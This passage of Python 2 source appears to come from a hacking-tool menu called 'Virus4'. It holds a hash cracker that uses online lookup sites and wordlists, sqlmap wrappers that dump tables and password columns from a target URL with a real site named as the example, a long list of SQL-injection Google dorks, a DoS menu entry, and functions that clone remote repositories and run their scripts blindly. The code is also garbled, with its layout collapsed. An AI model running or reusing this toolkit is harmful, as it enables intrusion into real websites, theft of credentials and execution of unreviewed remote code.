"+G+"hash type : "+W+"Mssql2000")                               hash = "mssql2000"                                                              elif len(hash_str)==len(mssql2005) and "0x0" in hash_str:                                       print (B+"["+R+"="+B+"] "+G+"hash type : "+W+"Mssql2005")                               hash = "mssql2005"                                                                                                          elif len(hash_str)==len(SHA512) and hash_str.isdigit()==False and hash_str.isalpha()==False and hash_str.isalnum()==True:                   print (Y+"   ["+W+"01"+Y+"] "+C+"sha512")                                               print (Y+"   ["+W+"02"+Y+"] "+C+"whirlpool")                            #               time.sleep(0.3)                             cek = raw_input(B+"["+W+"?"+B+"] "+G+"Choose hash "+Y+">>> "+W)                                                                     if cek == "1" or cek == "01" or cek == "sha512":                                                hash = "sha512"                     elif cek == "2" or cek == "02" or cek == "whirlpool":                                           hash = "whirlpool"                  else:                                               print (R+"["+W+"!"+R+"] "+G+"Exiting ... \n")                    #                       time.sleep(0.5)                            sys.exit()                                                              elif len(hash_str)==len(md) and hash_str.isdigit()==False and hash_str.isalpha()==False and hash_str.isalnum()==True:                                                                   print (Y+"   ["+W+"01"+Y+"] "+C+"md4")                                                  print (Y+"   ["+W+"02"+Y+"] "+C+"md5")                                                  print (Y+"   ["+W+"03"+Y+"] "+C+"Nthash")                                               print (Y+"   ["+W+"04"+Y+"] "+C+"Lmhash")                                               print (Y+"   ["+W+"05"+Y+"] "+C+"Ntlm hash")                                                                        #               time.sleep(0.3)                             cek = raw_input(B+"["+W+"?"+B+"] "+G+"Choose Hash "+Y+">>> "+W)                                                                     if cek == "1" or cek == "01" or cek == "md4" or cek == "MD4" or cek == "Md4":                                                               hash = "md4"                        elif cek == "2" or cek == "02" or cek == "md5" or cek == "MD5" or cek == "Md5":                                                             try:                                                print (B+"["+R+"="+B+"] "+G+"open google")              #                               time.sleep(0.3)                                                                         print (B+"["+W+"*"+B+"] "+G+"Start ...")                #                               time.sleep(0.3)                                                                         start = ("00:00:00")                                                                    start1 = time.time()                                                                    print (B+"\n["+W+"{}"+B+"] "+G+"Searching..."+Y).format(start)                                                                                                                  data = urlencode({"md5":hash_str,"x":"21","y":"8"})                                     html = urlopen("http://md5.my-addr.com/md5_decrypt-md5_cracker_online/md5_decoder_tool.php", data)                                  find = html.read()                                                                      match = search (r"<span class='middle_title'>Hashed string</span>: [^<]*</div>", find)                                              if match:                                                                                       end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                                                                  print (B+"["+W+"{}"+B+"] "+G+"Stopped...").format(end)                                      #                                       time.sleep(0.3)                                                                         print (B+"\n["+W+"="+B+"]"+G+" password found ")                                        print (B+"["+W+"+"+B+"] "+W+(hash_str)+Y+" 0={==> "+W+(match.group().split('span')[2][3:-6])+"\n")                                                                              sys.exit()                                                                      else:                                               data = urlencode({"md5":hash_str,"x":"21","y":"8"})                                                                                 html = urlopen("http://md5.my-addr.com/md5_decrypt-md5_cracker_online/md5_decoder_tool.php", data)                                                                              find = html.read()                                                                      match = search (r"<span class='middle_title'>Hashed string</span>: [^<]*</div>", find)                                              if match:                                                                                                                                   end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                                                              print (B+"["+W+"{}"+B+"] "+G+"Stopped...").format(end)                                  #                                          time.sleep(0.3)                                                                         print (B+"\n["+W+"="+B+"]"+G+" password found ")                                                                                    print (B+" ["+W+"+"+B+"] "+W+hash_str+Y+" 0={==> "+W+match.group().split('span')[2][3:-6]+W+" \n")                                                                              sys.exit()                                                                           else:                                                                                      url = "http://www.nitrxgen.net/md5db/" + hash_str                                                                                   cek = urlopen(url).read()                                                               if len(cek) > 0:                                                                                                                            end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                                                          print (B+"["+W+"{}"+B+"] "+G+"Stopped...").format(end)                                   #                                          time.sleep(0.3)                                                                                  print (B+"\n["+W+"="+B+"]"+G+" password found ")                                                                                   print (B+"["+W+"+"+B+"] "+W+hash_str+Y+" 0={==> "+W+cek+"\n")                                                               sys.exit()                                                                              else:                                                                                                                                       end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                                                          print (B+"["+W+"{}"+B+"]"+G+" password not found\n").format(end)                                                                    hash = "md5"                                                                                                     except IOError:                                                                                 end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                                                                  print (B+"["+W+"{}"+B+"]"+G+" Timeout\n").format(end)                                   hash = "md5"                                                            elif cek == "03" or cek == "3" or cek.upper() == "NTHASH":                                      hash = "nthash"                                                                 elif cek == "04" or cek == "4" or cek.upper() == "LMHASH":                                      hash = "lmhash"                                                                 elif cek == "05" or cek == "5" or cek.upper() == "NTLM":                                        hash = "ntlm"                                                                   else:                                               print (R+"["+W+"!"+R+"] "+G+"Exiting ... \n"+W)                 #                       time.sleep(0.5)                             sys.exit()                                                                                                          elif len(hash_str)==len(sha1) and hash_str.isdigit()==False and hash_str.isalpha()==False and hash_str.isalnum()==True:                                                                 print (Y+"   ["+W+"01"+Y+"] "+C+"sha1")                                                 print (Y+"   ["+W+"02"+Y+"] "+C+"ripemd160")                            #               time.sleep(0.3)                             cek = raw_input(B+"["+W+"?"+B+"] "+G+"Choose Hash "+Y+">>> "+W)                                                                     if cek == "1" or cek == "01" or cek == "sha1" or cek == "SHA1" or cek == "Sha1":                                    #                       time.sleep(0.5)                             print (B+"["+R+"="+B+"] "+G+"open google")                      #                       time.sleep(0.3)                             print (B+"["+W+"*"+B+"] "+G+"Start ...")                        #                       time.sleep(0.3)                             start = ("00:00:00")                        start1 = time.time()                        print (B+"\n["+W+"{}"+B+"] "+G+"Searching..."+Y).format(start)                          try:                                                                                            data = urlencode({"auth":"8272hgt", "hash":hash_str, "string":"","Submit":"Submit"})                                                html = urlopen("http://hashcrack.com/index.php" , data)                                 find = html.read()                                                                      match = search (r'<span class=hervorheb2>[^<]*</span></div></TD>', find)                                                            if match:                                                                                       end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                                                                  print (B+"["+W+"{}"+B+"] "+G+"Stopped...").format(end)                                      #                                       time.sleep(0.3)                                                                         print (B+"\n["+W+"="+B+"]"+G+" password found ")                                        print (B+"["+W+"+"+B+"] "+W+hash_str+Y+" 0={==> "+W+match.group().split('hervorheb2>')[1][:-18]+"\n")                                                                           sys.exit()                                                                                                                  else:                                                                                           end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                                                                  print (B+"["+W+"{}"+B+"]"+G+" password not found\n").format(date)                                                                   hash = "sha1"                                                           except IOError:                                                                                 end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                                                                  print (B+"["+W+"{}"+B+"]"+G+" Timeout\n").format(end)                                   hash = "sha1"                                                                                                       elif cek == "2" or cek == "02" or cek == "ripemd160":                                           hash = 'ripemd160'                  else:                                               print (R+"["+W+"!"+R+"] "+G+"Exiting ... \n"+W)                 #                       time.sleep(0.5)                             sys.exit()                                                              elif len(hash_str)==len(sha224) and hash_str.isdigit()==False and hash_str.isalpha()==False and hash_str.isalnum()==True:                   print (B+"["+R+"="+B+"] "+G+"hash type : "+W+"SHA224")                                  hash = "SHA224"                                                                 elif len(hash_str)==len(sha384) and hash_str.isdigit()==False and hash_str.isalpha()==False and hash_str.isalnum()==True:                   print (B+"["+R+"="+B+"] "+G+"hash type : "+W+"SHA384")                                  hash = "SHA384"                                                                 elif len(hash_str)==len(sha256) and hash_str.isdigit()==False and hash_str.isalpha()==False and hash_str.isalnum()==True:                   print (B+"["+R+"="+B+"] "+G+"hash type : "+W+"sha256")                  #               time.sleep(0.5)                             print (B+"["+R+"="+B+"] "+G+"open google")                              #               time.sleep(0.3)                             print (B+"["+W+"*"+B+"] "+G+"Start ...")                                #               time.sleep(0.3)                             start = ("00:00:00")                        start1 = time.time()                        print (B+"\n["+W+"{}"+B+"] "+G+"Searching..."+Y).format(start)                                                                      try:                                                data = urlencode({"hash":hash_str, "decrypt":"Decrypt"})                                html = urlopen("http://md5decrypt.net/en/Sha256/", data)                                find = html.read()                          match = search (r'<b>[^<]*</b><br/><br/>', find)                                        if match:                                                                                       end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                                                                  print (B+"["+W+"{}"+B+"] "+G+"Stopped...").format(end)  #                               time.sleep(0.3)                                                                         print (B+"\n["+W+"="+B+"]"+G+" password found ")                                        print (B+"["+W+"+"+B+"] "+W+hash_str+Y+" 0={==> "+W+match.group().split('<b>')[1][:-14]+"\n")                                       sys.exit()                                                                      else:                                                                                           end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                                                                  print (B+"["+W+"{}"+B+"]"+G+" password not found\n").format(end)                                                                    hash = "sha256"                                                         except IOError:                                                                                         end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                                                                  print (B+"["+W+"{}"+B+"]"+G+" Timeout\n").format(end)                                   hash = "sha256"                                                                                             else:                                               print (R+"["+W+"!"+R+"] "+G+"Hash error\n"+W)                                           sys.exit()                                                                      time.sleep(0.1)                             print (B+"["+W+"="+B+"] "+G+"cek wordlist ..")                                                                                      try:                                                w = open("wordlist.txt","r").readlines()                                                x = len(w)                          except IOError:                     #               time.sleep(0.5)                             print (B+"["+R+"="+B+"]"+G+" Can't load "+W+"wordlist.txt, "+G+"file not exist\n"+W)                                                sys.exit()                                                              #       time.sleep(0.3)                             print (B+"["+R+"="+B+"] "+G+"load "+W+"{}"+G+" words in "+W+"wordlist.txt").format(x)                                               print (B+"["+W+"*"+B+"] "+G+"start ..\n")                                       #       time.sleep(1)                                                                           start = ("00:00:00")                        start1 = time.time()                        print (B+"["+W+"{}"+B+"] "+G+"Cracking..."+Y).format(start)                                                                         pbar = progressbar.ProgressBar()                                                        if hash == "mysql1323":                                                                         hash_str = hash_str.lower()                 for line in pbar(w):                                line = line.strip()                         h = m20.encrypt(line)                                                                                                                                                           if h == hash_str:                                                                               end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                                  #                                time.sleep(0.3)                                                                        print (B+"\n["+W+"{}"+B+"] "+G+"Stopped...\n").format(end)                                          #                                time.sleep(0.3)                                                                        print (B+"["+W+"="+B+"]"+G+" password found ")                                          print (B+"["+R+"+"+B+"] "+W+hash_str+Y+" 0={==> "+W+line+W+"\n")                                                                    sys.exit()                                                              end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                      print (B+"["+W+"{}"+B+"]"+G+" password not found\n"+W).format(end)                      sys.exit()                                                                      elif hash == "lmhash":                                                                          hasb_str = hash_str.upper()                 for line in pbar(w):                                line = line.strip()                         h = lmhash.encrypt(line)                                                                if h == hash_str:                                                                               end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                                  #                                time.sleep(0.3)                                                                        print (B+"\n["+W+"{}"+B+"] "+G+"Stopped...\n").format(end)                                          #                                time.sleep(0.3)                                                                        print (B+"["+W+"="+B+"]"+G+" password found ")                                          print (B+"["+R+"+"+B+"] "+W+hash_str+Y+" 0={==> "+W+line+W+"\n")                                                                    sys.exit()                                                              end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                      print (B+"["+W+"{}"+B+"]"+G+" password not found\n"+W).format(end)                      sys.exit()                                                                      elif hash == "nthash":                                                                          hasb_str = hash_str.upper()                 for line in pbar(w):                                line = line.strip()                         h = nthash.encrypt(line)                                                                                                            if h == hash_str:                                                                               end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                                  #                                time.sleep(0.3)                                                                        print (B+"\n["+W+"{}"+B+"] "+G+"Stopped...\n").format(end)                                          #                                time.sleep(0.3)                                                                        print (B+"["+W+"="+B+"]"+G+" password found ")                                          print (B+"["+R+"+"+B+"] "+W+hash_str+Y+" 0={==> "+W+line+W+"\n")                                                                    sys.exit()                                                              end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                      print (B+"["+W+"{}"+B+"]"+G+" password not found\n"+W).format(end)                      sys.exit()                                                                      elif hash == "mysql41":                                                                         hash_str = hash_str.upper()                 for line in pbar(w):                                line = line.strip()                         h = m25.encrypt(line)                                                                                                               if h == hash_str:                                                                               end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                                  #                                time.sleep(0.3)                                                                        print (B+"\n["+W+"{}"+B+"] "+G+"Stopped...\n").format(end)                                          #                                time.sleep(0.3)                                                                        print (B+"["+W+"="+B+"]"+G+" password found ")                                          print (B+"["+R+"+"+B+"] "+W+hash_str+Y+" 0={==> "+W+line+W+"\n")                                                                    sys.exit()                                                              end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                      print (B+"["+W+"{}"+B+"]"+G+" password not found\n"+W).format(end)                      sys.exit()                                                                      elif hash == "mssql2000":                                                                       hash_str = hash_str.upper()                 for line in pbar(w):                                line = line.strip()                         h = ms20.encrypt(line)                                                                                                              if h == hash_str:                                                                               end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                                  #                                time.sleep(0.3)                                                                        print (B+"\n["+W+"{}"+B+"] "+G+"Stopped...\n").format(end)                                          #                                time.sleep(0.3)                                                                        print (B+"["+W+"="+B+"]"+G+" password found ")                                          print (B+"["+R+"+"+B+"] "+W+hash_str+Y+" 0={==> "+W+line+W+"\n")                                                                    sys.exit()                                                              end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                      print (B+"["+W+"{}"+B+"]"+G+" password not found\n"+W).format(end)                      sys.exit()                                                                      elif hash == "ntlm":                                                                            hash_str = hash_str.lower()                 for line in pbar(w):                                line = line.strip()                         h = ntlm_hash = binascii.hexlify(hashlib.new('md4', line.encode('utf-16le')).digest())                                              if h == hash_str:                                                                               end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                                  #                               time.sleep(0.3)                                                                         print (B+"\n["+W+"{}"+B+"] "+G+"Stopped...\n").format(end)                                          #                                time.sleep(0.3)                                                                        print (B+"["+W+"="+B+"]"+G+" password found ")                                          print (B+"["+R+"+"+B+"] "+W+hash_str+Y+" 0={==> "+W+line+W+"\n")                                                                    sys.exit()                                                              end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                      print (B+"["+W+"{}"+B+"]"+G+" password not found\n"+W).format(end)                      sys.exit()                                                                      elif hash == "mssql2005":                                                                       hasb_str = hash_str.upper()                 for line in pbar(w):                                line = line.strip()                         h = ms25.encrypt(line)                                                                                                              if h == hash_str:                                                                               end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                                  #                                time.sleep(0.3)                                                                        print (B+"\n["+W+"{}"+B+"] "+G+"Stopped...\n").format(end)                                          #                                time.sleep(0.3)                                                                        print (B+"["+W+"="+B+"]"+G+" password found ")                                          print (B+"["+R+"+"+B+"] "+W+hash_str+Y+" 0={==> "+W+line+W+"\n")                                                                    sys.exit()                                                                                                          end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                      print (B+"["+W+"{}"+B+"]"+G+" password not found\n"+W).format(end)                      sys.exit()                                                                      else:                                                                                           hash_str = hash_str.lower()                 for line in pbar(w):                                                                            line = line.strip()                         h = hashlib.new(hash)                                                                   h.update(line)                                                                          if h.hexdigest() == hash_str:                                                                                                               end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                                  #                               time.sleep(0.3)                                                                         print (B+"\n["+W+"{}"+B+"] "+G+"Stopped...\n").format(end)                                          #                               time.sleep(0.3)                                                                         print (B+"["+W+"="+B+"]"+G+" password found ")                                          print (B+"["+R+"+"+B+"] "+W+hash_str+Y+" 0={==> "+W+line+W+"\n")                                                                    sys.exit()                                                              end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                      print (B+"["+W+"{}"+B+"]"+G+" password not found\n"+W).format(end)                      sys.exit()                                                               try:                                               if sys.argv[1] == "-u":                             Update()                            elif sys.argv[1] == "-i" or sys.argv[1] == "--info":                                            info()                              else:                                               print (R+"["+W+"!"+R+"] "+G+"Command Error !!"+W)                                       sys.exit()                                                               except IndexError:                                 hash()                                                                           " Thanks you ^^"                            backtomenu_website()                       def termux_sql():                             def url():                                      print red +"                                          [0]back"                          time.sleep(0.05)                            print ""                                    time.sleep(0.05)                            print cyan+'[+]------'+red+' exomple '+cyan+'----------------------------------------------[+]'                                     time.sleep(0.05)                            print cyan+'  |  '+red+'URL :  '+cyan+'http://ceburealproperty.com/show_cat_page.php?id=3  |'                                       time.sleep(0.05)                            print cyan+'[+]-------------------------------------------------------------[+]'        time.sleep(0.05)                            url = raw_input(red +'   URL-------> ')                                                 a = str(url)                                if a == '0' or a == '00' :                    sql()                                     else :                                       os.system('python2 ~/sqlmap/sqlmap.py -u '+url+' --dbs s-- level=3 --risk=3 --batch')                                               def dataase():                               print red +"                                          [0]back"                          time.sleep(0.05)                            print ""                                    time.sleep(0.05)                            print cyan+'[+]------'+red+' exomple '+cyan+'----------------------------------------------[+]'                                     time.sleep(0.05)                            print cyan+'  |  '+red+'DATABASE :  '+cyan+'informations_schema                            |'                                       time.sleep(0.05)                            print cyan+'[+]-------------------------------------------------------------[+]'        data = raw_input(red +'   DATABASE-------> ')                                           x = str(data)                               if x == '0' or x == '00' :                    url()                                     else :                                       os.system('python2 ~/sqlmap/sqlmap.py -u '+url+' -D '+data+' --tables --level=3 --risk=3 --batch')                                  def table():                                 print red +"                                          [0]back"                          time.sleep(0.05)                            print ""                                    time.sleep(0.05)                            print cyan+'[+]------'+red+' exomple '+cyan+'----------------------------------------------[+]'                                     time.sleep(0.05)                            print cyan+'  |  '+red+'TABLE :  '+cyan+'user                                              |'                                       time.sleep(0.05)                            print cyan+'[+]-------------------------------------------------------------[+]'                                                    time.sleep(0.05)                            table = raw_input(red +'   TABLE-------> ')                                             d = str(table)                              if d == '0' or d == '00' :                     dataase()                                else :                                       os.system('python2 ~/sqlmap/sqlmap.py -u '+url+' -D '+data+' -T '+table+' --columns --level=3 --risk=3 --batch')                    def column():                                  print red +"                                          [0]back"                          time.sleep(0.05)                            print ""                                    time.sleep(0.05)                            print cyan+'[+]------'+red+' exomple '+cyan+'----------------------------------------------[+]'                                     time.sleep(0.05)                            print cyan+'  |  '+red+'COLUMN :  '+cyan+'admin $ password                                 |'                                       time.sleep(0.05)                            print cyan+'[+]-------------------------------------------------------------[+]'                                                    time.sleep(0.05)                            columns = raw_input(red +'   COLUMN-------> ')                                          c = str(columns)                            if c == '0' or c == '00' :                       table()                                else :                                        os.system('python2 ~/sqlmap/sqlmap.py -u '+url+' -D '+data+' -T '+table+' -C '+columns+' --dump --level=3 --risk=3 --batch')                                               column()                                  table()                                   dataase()                              url()                                       backtomenu_website()                      def kali_sql():                               def url():                                      print red +"                                          [0]back"                          time.sleep(0.05)                            print ""                                    time.sleep(0.05)                            print cyan+'[+]------'+red+' exomple '+cyan+'----------------------------------------------[+]'                                     time.sleep(0.05)                            print cyan+'  |  '+red+'URL :  '+cyan+'http://ceburealproperty.com/show_cat_page.php?id=3  |'                                       time.sleep(0.05)                            print cyan+'[+]-------------------------------------------------------------[+]'        time.sleep(0.05)                            url = raw_input(red +'   URL-------> ')                                                 a = str(url)                                if a == '0' or a == '00' :                    sql()                                     else :                                       os.system('sqlmap -u '+url+' --dbs s-- level=3 --risk=3 --batch')                       def dataase():                               print red +"                                          [0]back"                          time.sleep(0.05)                            print ""                                    time.sleep(0.05)                            print cyan+'[+]------'+red+' exomple '+cyan+'----------------------------------------------[+]'                                     time.sleep(0.05)                            print cyan+'  |  '+red+'DATABASE :  '+cyan+'informations_schema                            |'                                       time.sleep(0.05)                            print cyan+'[+]-------------------------------------------------------------[+]'        data = raw_input(red +'   DATABASE-------> ')                                           x = str(data)                               if x == '0' or x == '00' :                    url()                                     else :                                       os.system('sqlmap -u '+url+' -D '+data+' --tables --level=3 --risk=3 --batch')          def table():                                 print red +"                                          [0]back"                          time.sleep(0.05)                            print ""                                    time.sleep(0.05)                            print cyan+'[+]------'+red+' exomple '+cyan+'----------------------------------------------[+]'                                     time.sleep(0.05)                            print cyan+'  |  '+red+'TABLE :  '+cyan+'user                                              |'                                       time.sleep(0.05)                            print cyan+'[+]-------------------------------------------------------------[+]'                                                    time.sleep(0.05)                            table = raw_input(red +'   TABLE-------> ')                                             d = str(table)                              if d == '0' or d == '00' :                     dataase()                                else :                                       os.system('sqlmap.py '+url+' -D '+data+' -T '+table+' --columns --level=3 --risk=3 --batch')                                        def column():                                  print red +"                                          [0]back"                          time.sleep(0.05)                            print ""                                    time.sleep(0.05)                            print cyan+'[+]------'+red+' exomple '+cyan+'----------------------------------------------[+]'                                     time.sleep(0.05)                            print cyan+'  |  '+red+'COLUMN :  '+cyan+'admin $ password                                 |'                                       time.sleep(0.05)                            print cyan+'[+]-------------------------------------------------------------[+]'                                                    time.sleep(0.05)                            columns = raw_input(red +'   COLUMN-------> ')                                          c = str(columns)                            if c == '0' or c == '00' :                       table()                                else :                                        os.system('sqlmap -u '+url+' -D '+data+' -T '+table+' -C '+columns+' --dump --level=3 --risk=3 --batch')                       column()                                  table()                                   dataase()                              url()                                       backtomenu_website()                                                                  def sql():                                   print ''                                    time.sleep(0.05)                            print red +"                                          [0]back"                          time.sleep(0.05)                            print ''                                    time.sleep(0.05)                            print cyan +'        [01]Hack web sql in Termux'                                        time.sleep(0.05)                            print cyan +'        [02]Hack web sql in Kali linux'                                    time.sleep(0.05)                            print ''                                    time.sleep(0.05)                            print ''                                    time.sleep(0.05)                            print ''                                    time.sleep(0.05)                            nember =raw_input("Virus4(" + red + "website/hack_web_sql"+ cyan + ") > ")              if nember == '1' or nember == '01' :             termux_sql()                           elif nember == '2' or nember == '02' :           kali_sql()                             elif nember == '0' or nember == '00' :           website()                              else :                                           error()                                     sql()                                 def dork():                                  print cyan+"""                             inurl:trainers.php?id=                      inurl:buy.php?category=                     inurl:article.php?ID=                       inurllay_old.php?id=                        inurl:declaration_more.php?decl_id=         inurlageid=                                 ld.php?id=                                  inurl:declaration_more.php?decl_id=         inurlageid=                                 inurl:games.php?id=                         inurlage.php?file=                          inurl:newsDetail.php?id=                    inurl:gallery.php?id=                       inurl:article.php?id=                       inurl:show.php?id=                          inurl:staff_id=                             inurl:newsitem.php?num=                     inurl:readnews.php?id=                      inurl:top10.php?cat=                        inurl:historialeer.php?num=                 inurl:reagir.php?num=                       inurl:Stray-Questions-View.php?num=         inurl:forum_bds.php?num=                    inurl:game.php?id=                          inurl:index.php?id=                         inurl:trainers.php?id=                      inurl:buy.php?category=                     inurl:article.php?ID=                       inurllay_oinurl:view_product.php?id=        inurl:newsone.php?id=                       inurl:sw_comment.php?id=                    inurl:news.php?id=                          inurl:avd_start.php?avd=                    inurl:event.php?id=                         inurlroduct-item.php?id=                    inurl:sql.php?id=                           inurl:news_view.php?id=                     inurl:select_biblio.php?id=                 inurl:humor.php?id=                         inurl:aboutbook.php?id=                     inurlgl_inet.php?ogl_id=                    inurl:fiche_spectacle.php?id=               inurl:communique_detail.php?id=             inurl:sem.php3?id=                          inurl:kategorie.php4?id=                    inurl:news.php?id=                          inurl:index.php?id=                         inurl:faq2.php?id=                          inurl:show_an.php?id=                       inurl:review.php?id=                        inurl:loadpsb.php?id=                       inurlinions.php?id=                         inurl:spr.php?id=                           inurlages.php?id=                           inurl:announce.php?id=                      inurl:clanek.php4?id=                       inurlarticipant.php?id=                     inurl:download.php?id=                      inurl:main.php?id=                          inurl:review.php?id=                        inurl:chappies.php?id=                      inurl:read.php?id=                          inurlrod_detail.php?id=                     inurl:viewphoto.php?id=                     inurl:article.php?id=                       inurlerson.php?id=                          inurlroductinfo.php?id=                     inurl:showimg.php?id=                       inurl:view.php?id=                          inurl:***site.php?id=                       inurl:hosting_info.php?id=                  inurl:gallery.php?id=                       inurl:rub.php?idr=                          inurl:view_faq.php?id=                      inurl:artikelinfo.php?id=                   inurl:detail.php?ID=                        inurl:index.php?=                           inurlrofile_view.php?id=                    inurl:category.php?id=                      inurlublications.php?id=                    inurl:fellows.php?id=                       inurl:downloads_info.php?id=                inurlrod_info.php?id=                       inurl:shop.php?do=part&id=                  inurlroductinfo.php?id=                     inurl:collectionitem.php?id=                inurl:band_info.php?id=                     inurlroduct.php?id=                         inurl:releases.php?id=                      inurl:ray.php?id=                           inurlroduit.php?id=                         inurlop.php?id=                             inurl:shopping.php?id=                      inurlroductdetail.php?id=                   inurlost.php?id=                            inurl:viewshowdetail.php?id=                inurl:clubpage.php?id=                      inurl:memberInfo.php?id=                    inurl:section.php?id=                       inurl:theme.php?id=                         inurlage.php?id=                            inurl:shredder-categories.php?id=           inurl:tradeCategory.php?id=                 inurlroduct_ranges_view.php?ID=             inurl:shop_category.php?id=                 inurl:transcript.php?id=                    inurl:channel_id=                           inurl:item_id=                              inurl:newsid=                               inurl:trainers.php?id=                      inurl:news-full.php?id=                     inurl:news_display.php?getid=               inurl:index2.php?option=                    inurl:readnews.php?id=                      inurl:top10.php?cat=                        inurl:newsone.php?id=                       inurl:event.php?id=                         inurlroduct-item.php?id=                    inurl:sql.php?id=                           inurl:aboutbook.php?id=                     inurlreview.php?id=                         inurl:loadpsb.php?id=                       inurlages.php?id=                           inurl:material.php?id=                      inurl:clanek.php4?id=                       inurl:announce.php?id=                      inurl:chappies.php?id=                      inurl:read.php?id=                          inurl:viewapp.php?id=                       inurl:viewphoto.php?id=                     inurl:rub.php?idr=                          inurl:galeri_info.php?l=                    inurl:review.php?id=                        inurl:iniziativa.php?in=                    inurl:curriculum.php?id=                    inurl:labels.php?id=                        inurl:story.php?id=                         inurl:look.php?ID=  inurl:index.php?id=     inurl:trainers.php?id=                      inurl:buy.php?category=                     inurl:article.php?ID=                       inurl:play_old.php?id=                      inurl:declaration_more.php?decl_id=         inurl:pageid=                               inurl:games.php?id=                         inurl:page.php?file=                        inurl:newsDetail.php?id=                    inurl:gallery.php?id=                       inurl:article.php?id=                       inurl:show.php?id=                          inurl:staff_id=                             inurl:newsitem.php?num=                     inurl:readnews.php?id=                      inurl:top10.php?cat=                        inurl:historialeer.php?num=                 inurl:reagir.php?num=                       inurl:Stray-Questions-View.php?num=         inurl:forum_bds.php?num=                    inurl:game.php?id=                          inurl:view_product.php?id=                  inurl:newsone.php?id=                       inurl:sw_comment.php?id=                    inurl:news.php?id=                          inurl:avd_start.php?avd=                    inurl:event.php?id=                         inurl:product-item.php?id=                  inurl:sql.php?id=                           inurl:news_view.php?id=                     inurl:select_biblio.php?id=                 inurl:humor.php?id=                         inurl:aboutbook.php?id=                     inurl:ogl_inet.php?ogl_id=                  inurl:fiche_spectacle.php?id=               inurl:communique_detail.php?id=             inurl:sem.php3?id=                          inurl:kategorie.php4?id=                    inurl:news.php?id=                          inurl:index.php?id=                         inurl:faq2.php?id=                          inurl:show_an.php?id=                       inurl:preview.php?id=                       inurl:loadpsb.php?id=                       inurl:opinions.php?id=                      inurl:spr.php?id=                           inurl:pages.php?id=                         inurl:announce.php?id=                      inurl:clanek.php4?id=                       inurl:participant.php?id=                   inurl:download.php?id=                      inurl:main.php?id=                          inurl:review.php?id=                        inurl:chappies.php?id=                      inurl:read.php?id=                          inurl:prod_detail.php?id=                   inurl:viewphoto.php?id=                     inurl:article.php?id=                       inurl:person.php?id=                        inurl:productinfo.php?id=                   inurl:showimg.php?id=                       inurl:view.php                              """                                          backtomenu_website()                       def website():                               print ''                                    time.sleep(0.05)                            print red +"                                          [0]back"                          time.sleep(0.05)                            print ''                                    time.sleep(0.05)                            print cyan +'        [01]Dos Attack'        time.sleep(0.05)                            print cyan +'        [02]Admin panel finder'                                            time.sleep(0.05)                            print cyan +'        [03]hash id '          time.sleep(0.05)                            print cyan +'        [04]HaCk WEB SQL'      time.sleep(0.05)                            print cyan +'        [05]Dork Google'       time.sleep(0.05)                            print ''                                    time.sleep(0.05)                            print ''                                    time.sleep(0.05)                            print ''                                    time.sleep(0.05)                            nember =raw_input("Virus4(" + red + "website"+ cyan + ") > ")                           if nember == '1' or nember == '01' :             ddos()                                 elif nember == '2' or nember == '02' :           admin()                                elif nember == '3' or nember == '03' :           hash_id()                              elif nember == '4' or nember == '04' :           sql()                                  elif nember == '5' or nember == '05' :           dork()                                 elif nember == '0' or nember == '00' :           Virus4()                               else :                                           error()                                     website()                             def up_date():                               print ''                                    time.sleep(0.05)                            print red +"                                          [0]back"                          time.sleep(0.05)                            print ''                                    x = raw_input(cyan +'enter in update >')    if x == "0" or x == '00':                     Virus4()                                  else :                                       os.system('rm -rf update.sh')               f = open('update.sh' , 'w')                 f.write('''                               rm -rf update.sh                            rm -rf ../Virus4                            cd ..                                       git clone https://github.com/amerlaceset/Virus4                                         cd Virus4                                   chmod +x *                                  echo ''                                     echo ' hello '                              echo '       in'                            echo '          last'                       echo '               version'               echo ''                                     sleep 6                                     python2 Virus4.py                           ''')                                          f.close()                                   os.system('mv -v update.sh ..')             os.system('bash ../update.sh')            def my_youtube():                            print ""                                    time.sleep(2)                               print cyan+'  {'+red+'Virus4 Hacking'+cyan+'}--------{'+red+'https://www.youtube.com/channel/UCmQETFbkmkiSiu3og6F8usg'+cyan+'}'     time.sleep(6)                               webbrowser.open_new('https://www.youtube.com/channel/UCmQETFbkmkiSiu3og6F8usg')         os.system("termux-open https://www.youtube.com/channel/UCmQETFbkmkiSiu3og6F8usg ")      Virus4()                                   def my_facebook():                           print ""                                    time.sleep(2)                               print cyan+'  {'+blue+'Amer Amer'+cyan+'}--------{'+blue+'https://www.facebook.com/100019536310282'+cyan+'}'                        time.sleep(6)                               webbrowser.open_new('https://www.facebook.com/100019536310282')                         os.system('termux-open https://www.facebook.com/100019536310282')                       Virus4()                                   def moni():                                  print ''                                    time.sleep(2)                               print cyan + '[*]starting the Virus4 ...'   time.sleep(3)                               print ''                                    os.system('rm -rf moni')                    os.system('git clone https://github.com/amerlaceset/moni')                              os.system('clear')                          os.system('bash moni/mona.sh')              os.system('rm -rf moni')                   def sem():                                   e = str(random.randint(1,18))               if e in "1":                                  sem_2()                                   elif e in "2":                                sem_3()                                   elif e in "3":                                sem_4()                                   elif e in "4":                                